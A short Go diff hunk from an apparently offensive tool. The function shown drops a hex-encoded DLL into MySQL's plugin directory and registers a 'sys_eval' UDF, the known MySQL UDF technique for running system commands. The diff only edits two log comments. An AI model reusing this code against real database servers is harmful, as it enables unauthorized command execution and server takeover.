@@ -100,12 +100,12 @@ func MysqlExec(db *sql.DB, cmd string) {
 	dSql := fmt.Sprintf("select 0x%s into dumpfile '%s\\%s.dll'", d, strings.Replace(pluginDir, "\\", "\\\\", -1), filename)
 	_, err = db.Exec(dSql)
 	if err != nil {
-		//logger.Error("尝试UDF导出失败", err)
+		// 尝试UDF导出失败
 		return
 	}
 	_, err = db.Exec(fmt.Sprintf("create function sys_eval returns string soname '%s.dll'", filename))
 	if err != nil && !strings.Contains(err.Error(), "already exists") {
-		//logger.Error("尝试创建函数失败", err)
+		// 尝试创建函数失败
 		return
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
